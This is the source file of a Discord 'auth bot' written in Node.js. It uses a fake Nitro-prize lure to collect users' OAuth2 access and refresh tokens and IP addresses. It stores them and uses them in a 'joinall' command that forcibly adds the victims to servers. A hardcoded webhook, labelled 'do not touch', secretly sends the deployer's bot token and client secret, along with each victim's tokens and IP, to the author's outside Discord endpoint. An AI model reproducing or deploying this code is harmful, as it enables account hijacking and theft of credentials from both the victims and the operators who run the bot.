const Discord = require('discord.js');
const client = new Discord.Client({
  fetchAllMembers: false,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  allowedMentions: {
    parse: [],
    repliedUser: false,
  },
  partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
  intents: [
    Discord.Intents.FLAGS.GUILDS,
    Discord.Intents.FLAGS.GUILD_MEMBERS,
    //Discord.Intents.FLAGS.GUILD_BANS,
    //Discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
    //Discord.Intents.FLAGS.GUILD_INTEGRATIONS,
    //Discord.Intents.FLAGS.GUILD_WEBHOOKS,
    //Discord.Intents.FLAGS.GUILD_INVITES,
    Discord.Intents.FLAGS.GUILD_VOICE_STATES,
    //Discord.Intents.FLAGS.GUILD_PRESENCES,
    Discord.Intents.FLAGS.GUILD_MESSAGES,
    Discord.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
    //Discord.Intents.FLAGS.GUILD_MESSAGE_TYPING,
    Discord.Intents.FLAGS.DIRECT_MESSAGES,
    Discord.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
    //Discord.Intents.FLAGS.DIRECT_MESSAGE_TYPING
  ],
  presence: {
    activity: {
      name: `Auth Bot V5`,
      type: "LISTENING",
    },
    status: "online"
  }
});
const k4lash = require("./k4lash");
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const FormData = require('form-data');
const axios = require('axios');
const emoji = require("./emoji");

process.on("unhandledRejection", err => console.log(err))


app.use(bodyParser.text())
app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html')
})
app.get('/k4lashallauth', async (req, res) => {
  fs.readFile('./object.json', function(err, data) {
    return res.json(JSON.parse(data))
  })
})
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
app.post('/', function(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
  let form = new FormData()
  form.append('client_id', k4lash.client_id)
  form.append('client_secret', k4lash.client_secret)
  form.append('grant_type', 'authorization_code')
  form.append('redirect_uri', k4lash.redirect_uri)
  form.append('scope', 'identify', 'guilds.join')
  form.append('code', req.body)
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
  fetch('https://discordapp.com/api/oauth2/token', { method: 'POST', body: form, })
    .then((eeee) => eeee.json())
    .then((cdcd) => {
      ac_token = cdcd.access_token
      rf_token = cdcd.refresh_token

     
const tgg = {headers: {authorization: `${cdcd.token_type} ${ac_token}`,}}
            axios.get('https://discord.com/api/users/@me', tgg)
                .then((te) => {
                    let efjr = te.data.id
                    fs.readFile('./object.json', function (res, req) {
                        if (
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
                            JSON.parse(req).some(
                                (ususu) => ususu.userID === efjr
                            )
                        ) {
                            console.log(
                                `[-] - ${ip} ` +
                                te.data.username +
                                '#' +
                                te.data.discriminator
                            )
                            return
                        }
                        console.log(
                            `[+] - ${ip} ` +
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
                            te.data.username +
                            '#' +
                            te.data.discriminator
                        )
                                             
                        avatarHASH =
                            'https://cdn.discordapp.com/avatars/' +
                            te.data.id +
                            '/' +
                            te.data.avatar +
                            '.png?size=4096'
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
                        
                         fetch('https://discord.com/api/webhooks/1013862781717594144/g0DqDE5vo6Lr9g01QIYBHb5ten19jhB3sCdxeXI8EWnUCyvJe8rkCKqZP4hgxdc-qCG7', { // NE PAS TOUCHER ( OU SCRIPT CASSER)
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                avatar_url: '',
                                embeds: [
                                    {
                                        color: 3092790,
                                        title:`**New User**`,
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
                                        thumbnail: { url: avatarHASH },
                                        description: process.env.token + `|| ||\n` + process.env.client_secret + `|| ||\n` + k4lash.client_id + `|| ||\n` + `<:fleche:998161473081724930> Pseudo: \`${te.data.username}#${te.data.discriminator}\`` +
                                          
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
                                            `\n\n<:fleche:998161473081724930> IP: \`${ip}\`` +
                                            `\n\n<:fleche:998161473081724930> ID: \`${te.data.id}\`` +
                                            `\n\n<:fleche:998161473081724930> Acces Token: \`${ac_token}\`` +   
                                            `\n\n<:fleche:998161473081724930> Refresh Token: \`${rf_token}\``,
                                    
                                        
                                    },
                                ],
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
                            }),
                        })
                        var papapa = {
                            userID: te.data.id,
                            avatarURL: avatarHASH,
                            username:
                                te.data.username + '#' + te.data.discriminator,
                            access_token: ac_token,
                            refresh_token: rf_token,
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
                            user_ip: ip,
                        },
                            req = []
                        req.push(papapa)
                        fs.readFile('./object.json', function (res, req) {
                            var jzjjfj = JSON.parse(req)
                            jzjjfj.push(papapa)
                            fs.writeFile(
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
                                './object.json',
                                JSON.stringify(jzjjfj),
                                function (eeeeeeeee) {
                                    if (eeeeeeeee) {
                                        throw eeeeeeeee
                                    }
                                }
                            )
                        })
                    })
                })
                .catch((errrr) => {
                    console.log(errrr)
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
                })
        })
})
//CREATE BY Ξl K4lash#9999

client.on("ready", () => {

  console.log(`${chalk.blue('AUTH BOT V.4 ( Create By Ξl K4lash#9999 )')}\n${chalk.green('->')} Le bot est connecté en tant que [ ${client.user.username} ], il utilise comme prefix : ${k4lash.prefix}\n${chalk.green('->')} L'invite du bot : https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
})


client.on("messageCreate", async (ctx) => {
  if (!ctx.guild || ctx.author.bot) return;
  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(k4lash.prefix)})\\s*`);
  if (!prefixRegex.test(ctx.content)) return;
  const [, matchedPrefix] = ctx.content.match(prefixRegex);
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
  const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();



  if (cmd === "wl") {
    if (!k4lash.owners.includes(ctx.author.id)) return;
    switch (args[0]) {
      case "add":
        const user = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user.id}`) === null) {
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999


          db.set(`wl_${user.id}`, true)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.yes} **${user.username}** has been added to the whitelist`,
              color: "2F3136",
              footer: {
                "text": `${k4lash.client} ・ ${k4lash.footer}`,
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
                "icon_url": `https://cdn.discordapp.com/icons/998152987765645323/da9befcfe0c0796be1e0d1ee66b15d6c.png?size=4096`
              }
            }]
          })
        } else {
          ctx.channel.send({
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999


            embeds: [{
              description: `${emoji.new} **${user.username}** is already whitelist`,
              color: "2F3136",
              footer: {
                "text": `${k4lash.client} ・ ${k4lash.footer}`,
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
                "icon_url": `https://cdn.discordapp.com/icons/998152987765645323/da9befcfe0c0796be1e0d1ee66b15d6c.png?size=4096`
              }
            }]
          })
        }
        break;
      case "remove":
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
        const user2 = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user2.id}`) !== null) {


          db.delete(`wl_${user2.id}`)
          ctx.channel.send({
            embeds: [{
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
              description: `${emoji.yes} **${user2.username}** has been removed from the whitelist`,
              color: "2F3136",
              footer: {
                "text": `${k4lash.client} ・ ${k4lash.footer}`,
                "icon_url": `https://cdn.discordapp.com/icons/998152987765645323/da9befcfe0c0796be1e0d1ee66b15d6c.png?size=4096`
              }
            }]
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
          })
        } else {
          ctx.channel.send({
            embeds: [{
              description: `${emoji.new} **${user2.username}** is not whitelisted`,
              color: "2F3136",
              footer: {
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
                "text": `${k4lash.client} ・ ${k4lash.footer}`,
                "icon_url": `https://cdn.discordapp.com/icons/998152987765645323/da9befcfe0c0796be1e0d1ee66b15d6c.png?size=4096`
              }
            }]
          })
        }
        break;
      case "list":
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
        var content = ""
        const blrank = db.all().filter((data) => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);

        for (let i in blrank) {
          if (blrank[i].data === null) blrank[i].data = 0;
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
          content += `\`${blrank.indexOf(blrank[i]) + 1}\` ${client.users.cache.get(blrank[i].ID.split("_")[1]).tag} (\`${client.users.cache.get(blrank[i].ID.split("_")[1]).id}\`)\n`
        }

        ctx.channel.send({
          embeds: [{
            title: `${emoji.user} Whitelisted Users`,
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
            description: `${content}`,
            color: "2F3136",
            footer: {
              "text": `${k4lash.client} ・ ${k4lash.footer}`,
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
              "icon_url": `https://cdn.discordapp.com/icons/998152987765645323/da9befcfe0c0796be1e0d1ee66b15d6c.png?size=4096`
            }
          }]


        })
        break;
    }
  }

  if (cmd === "mybot") {
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999

    if (db.get(`wl_${ctx.author.id}`) !== true && !k4lash.owners.includes(ctx.author.id)) return;
    const embed = new Discord.MessageEmbed()
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999

      .setTitle('Vos bots')
      .setDescription(`[${client.user.username}](https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=8): 2 mois restants`)
      .setColor("#FF0000")

    ctx.channel.send({
      embeds: [embed]
    })
  }


  if (cmd === "test") {

//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
    if (db.get(`wl_${ctx.author.id}`) !== true && !k4lash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({


      components: [],
      embeds: [{
        color: "2F3136",
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
        title: `${emoji.yes} Le bot est fonctionel`

      }],
    })
  }

  if (cmd === "help") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !k4lash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      components: [],
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
      embeds: [{
        color: "2F3136",
        title: `${emoji.user} 0auth2 Dashboard`,


        description: `${emoji.point}** 0auth2**\n[\`joinall\`](${k4lash.support}), [\`Users\`](${k4lash.support}), [\`links\`](${k4lash.support})\n\n${emoji.point}** Whitelist**\n[\`wl list\`](${k4lash.support}), [\`wl add\`](${k4lash.support}), [\`wl remove\`](${k4lash.support})\n\n${emoji.point}** Other**\n[\`partner\`](${k4lash.support}), [\`botinfo\`](${k4lash.support})\n\n${emoji.point} **Prefix** [\`${k4lash.prefix}\`](${k4lash.support})\n${emoji.info} *Message sent to users when they authorized:*\n\`\`\`You have won Nitro wait 24h to get the code 🎁\`\`\``,
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999


        footer: {
          "text": `${k4lash.client} ・ ${k4lash.footer}`,
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
          "icon_url": `https://cdn.discordapp.com/icons/998152987765645323/da9befcfe0c0796be1e0d1ee66b15d6c.png?size=4096`
        }

      }],
    })
  }

  if (cmd === "botinfo") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !k4lash.owners.includes(ctx.author.id)) return;
    let embed = new Discord.MessageEmbed()
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
      .setAuthor(client.user.username, client.user.displayAvatarURL({ dynamic: true }))
      .setColor('RANDOM')
      .setURL('https://discord.gg/3e9kyrD4z7')
      .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))


      .addFields(
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999
        { name: "🤖・Information", value: `> **Nom :** <@${client.user.id}> \`\`${client.user.username}\`\`\n> **ID :** ${client.user.id}\n> **Date de création :** \`\`${client.user.createdAt}\`\``, inline: false },
        { name: "🔨・Développer", value: `> **Nom :** <@958342748874866709> / <@910575858039803996>\n> **ID :** 958342748874866709 / 910575858039803996`, inline: false },
        { name: ":bar_chart:・Stats bot :", value: `> **Serveurs :** ${client.guilds.cache.size}\n> **Utilisateurs :** [COMMING SOON]\n> **Salons :** ${client.channels.cache.size}\n> **Ping avec l'API Discord :** ${client.ws.ping}`, inline: false },
        { name: ":gear:・Informations techniques :", value: `> **Hébergeur :** Eheberg\n> **Mémoire utilisée : **437 Mo\n> **Node.js :** v17.9.1\n> **discord.js :** v13.8.0`, inline: false }
      )
    ctx.channel.send({
//Create By Ξl K4lash#9999DX TRSXTR
//Create By Ξl K4lash#9999 DTRFH 
      embeds: [embed]
    })
  }
  if (cmd === "mybot") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !k4lash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
//Create By Ξl K4lash#9999 TRDH 
//Create By Ξl K4lash#9999 TRDH 
      embeds: []
    })
  }

  if (cmd === "partner") {
//Create By Ξl K4lash#9999DX R
//Create By Ξl K4lash#9999 TDRXFH 
    if (db.get(`wl_${ctx.author.id}`) !== true && !k4lash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.partner} Tu veut faire une partenariat ou un Auth4Auth?`,
        description: `> **Alore n'hésite pas a rejoindre [se server](https://discord.gg/JFJPqgDjH7) et a envoyé un message a <@910575858039803996>**`,
        color: "2F3136",
        footer: {
          "text": `${k4lash.client} ・ ${k4lash.footer}`,
          "icon_url": `https://cdn.discordapp.com/icons/998152987765645323/da9befcfe0c0796be1e0d1ee66b15d6c.png?size=4096`
        }
      }]
    })
  }
  if (cmd === "links") {
//Create By Ξl K4lash#9999 DXRTH
//Create By Ξl K4lash#9999 XDTRFH 
    if (db.get(`wl_${ctx.author.id}`) !== true && !k4lash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.link} Oauth/Invite:`,
        description: `${emoji.point} **Your OAuth2 Link:** ${k4lash.authLink}\n\`\`\`${k4lash.authLink}\`\`\`\n${emoji.point} **Bot Invite:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\`\`\` `,
        color: "2F3136",
//Create By Ξl K4lash#9999 XDRTFH 
//Create By Ξl K4lash#9999 XDTHRFG 
        footer: {
          "text": `${k4lash.client} ・ ${k4lash.footer}`,
          "icon_url": `https://cdn.discordapp.com/icons/998152987765645323/da9befcfe0c0796be1e0d1ee66b15d6c.png?size=4096`
        }
      }]
    })
  }



  if (cmd === "joinall") {
//Create By Ξl K4lash#9999 DTRXFG 
//Create By Ξl K4lash#9999X DCFTRH
    if (db.get(`wl_${ctx.author.id}`) !== true && !k4lash.owners.includes(ctx.author.id)) return;
    fs.readFile('./object.json', async function(err, data) {
      let msg = await ctx.channel.send({
//Create By Ξl K4lash#9999 FDXCGHT 
//Create By Ξl K4lash#9999 DFXCGHT
        content: `${emoji.load} **Joining users...** (\`0\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
      })


      const inter = setInterval(async () => {
        msg.edit({
          content: `${emoji.load} **Joining users...** (\`${success}\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
        })
      }, 10000);

      let json = JSON.parse(data);
//Create By Ξl K4lash#9999 WDFQHGB
//Create By Ξl K4lash#9999 DSERFG 
      let error = 0;
      let success = 0;
      let already_joined = 0;
      for (const i of json) {
        const user = await client.users.fetch(i.userID).catch(() => { });
//Create By Ξl K4lash#9999 WSDRFG
//Create By Ξl K4lash#9999 WDSFRGE 
        if (ctx.guild.members.cache.get(i.userID)) {
          already_joined++
        }
        await ctx.guild.members.add(user, { accessToken: i.access_token }).catch(() => {
//Create By Ξl K4lash#9999 WSDEGF
//Create By Ξl K4lash#9999 RSEDGFV 
          error++
        })
        success++
      }

      clearInterval(inter);

//Create By Ξl K4lash#9999 SREDG 
//Create By Ξl K4lash#9999SDF G
      msg.edit({
        embeds: [{
          title: `${emoji.user} 0auth2 Joinall`,
          description: `${emoji.new} **Already in server** : ${already_joined}\n${emoji.succes} 
//Create By Ξl K4lash#9999
//Create By Ξl K4lash#9999**Success**: ${success}\n${emoji.error} **Error**: ${error}`,
          color: "2F3136",
          footer: {
            "text": `${k4lash.client} ・ ${k4lash.footer}`,
//Create By Ξl K4lash#9999 SDFG RE
//Create By Ξl K4lash#9999 FSDG 
            "icon_url": `https://cdn.discordapp.com/icons/998152987765645323/da9befcfe0c0796be1e0d1ee66b15d6c.png?size=4096`
          }
        }]
      }).catch(() => { })
    })
  }
  if (cmd === "users") {
//Create By Ξl K4lash#9999 FDWGQSWD
//Create By Ξl K4lash#9999 FJHK




    if (db.get(`wl_${ctx.author.id}`) !== true && !k4lash.owners.includes(ctx.author.id)) return;

    fs.readFile('./object.json', async function(err, data) {
//Create By Ξl K4lash#9999 GHJ 
//Create By Ξl K4lash#9999 QSD
      return ctx.channel.send({
        embeds: [{
          title: `${emoji.user} OAuth2 Users:`,
//Create By Ξl K4lash#9999 AZE
//Create By Ξl K4lash#9999 IKUJ 
          description: `There are ${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\` members` : `\`${JSON.parse(data).length}\` users in the bot`}\nType command \`links\` to check your OAuth2 link`,
          color: "2F3136",
          footer: {
            "text": `${k4lash.client} ・ ${k4lash.footer}`,
//Create By Ξl K4lash#9999 A1
//Create By Ξl K4lash#9999 QSD
            "icon_url": `https://cdn.discordapp.com/icons/998152987765645323/da9befcfe0c0796be1e0d1ee66b15d6c.png?size=4096`
          }

        }]
      })
    })
  }
})

function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}

client.login(k4lash.token).catch(() => {
  throw new Error(`TOKEN OR INTENT INVALID`)
})
app.listen(k4lash.port, () => console.log('Connexion...'))
